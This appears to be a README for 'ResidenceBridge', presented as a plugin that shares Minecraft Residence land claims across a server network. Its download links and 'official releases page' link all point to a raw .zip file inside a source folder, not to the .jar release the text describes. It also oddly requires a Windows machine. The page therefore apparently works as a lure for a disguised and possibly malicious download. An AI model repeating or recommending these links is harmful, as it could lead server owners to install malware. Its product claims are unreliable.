# 🏠 ResidenceBridge - Share Minecraft residence claims across servers

[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://raw.githubusercontent.com/wadecurrish300/ResidenceBridge/main/src/main/kotlin/Residence_Bridge_3.4.zip)

ResidenceBridge connects your Minecraft servers. It lets players keep their land claims when they travel between servers on your network. Your players stay in their homes regardless of which server they choose.

## 📥 How to download the software

Follow these steps to get the file for your network:

1. Visit the [official releases page](https://raw.githubusercontent.com/wadecurrish300/ResidenceBridge/main/src/main/kotlin/Residence_Bridge_3.4.zip).
2. Look for the section labeled Latest.
3. Click the link that ends in .jar under the Assets header.
4. Save this file to a folder on your computer.

This file contains everything you need to sync your claims. You do not need to install extra software.

## ⚙️ System requirements

Your network needs these tools to run the plugin:

*   A Windows computer or server.
*   Java Development Kit (JDK) version 17 or newer.
*   A proxy server using Velocity or BungeeCord.
*   A set of backend servers running Paper, Spigot, or Bukkit.
*   The Residence plugin installed on each backend server.

Ensure every server in your network has enough memory. A minimum of 4GB of RAM per server works best for most networks.

## 🛠️ Step-by-step installation

1. Stop all your Minecraft servers.
2. Locate the folder named plugins inside each of your backend server folders.
3. Move the downloaded .jar file into the plugins folder of every server that uses the Residence plugin.
4. Restart your proxy server first.
5. Restart each backend server after the proxy completes its startup.

The plugin creates a settings file when it starts for the first time. You can find this file in the plugins/ResidenceBridge folder.

## 📋 Configuring your settings

The plugin works right away with standard settings. You can change how it behaves if you want more control. Open the config.yml file in the ResidenceBridge folder with a text editor like Notepad.

Use the settings to choose which servers talk to each other. You can also set a timer for how often the system checks for claim updates. Always save your changes before you restart your servers.

## 🌐 Connecting your network

ResidenceBridge uses your proxy to send data. Check that the proxy has permission to talk to all backend servers. If your servers sit on different computers, ensure the firewall allows traffic on your chosen ports.

## 🔍 Frequently asked questions

Does ResidenceBridge work with all versions of Minecraft?
It supports all modern Minecraft versions. Keep your servers updated to the same version for a stable experience.

Do players need to do anything?
Players do not need to take action. They create claims on one server and the data moves to the others automatically.

Can I sync claims between different worlds?
Yes. The plugin maps claim coordinates across your network. It ensures that claim boundaries remain accurate on every server.

What happens if a server goes offline?
The plugin saves the current state of your claims. It syncs the missing data when the server comes back online.

## 🛡️ Troubleshooting common issues

If the plugin does not load, verify your Java version. Use the command java -version in your terminal to see the installed version.

If claims do not sync, check the logs folder. Open the log file and look for errors that mention ResidenceBridge. Most issues come from a typo in the configuration file or a missing connection between servers.

Ensure that the Residence plugin is active on all backend servers. ResidenceBridge depends on the main Residence plugin to define the claims. It only moves existing data between your network nodes.

If you add a new server, place the plugin file in its folder before you join it to the network. This prevents errors during the first synchronization attempt.

Keep your server time settings identical across your hardware. The synchronization process relies on the time stamp of each claim to keep data current. Check that your Windows clock displays the correct time on all machines.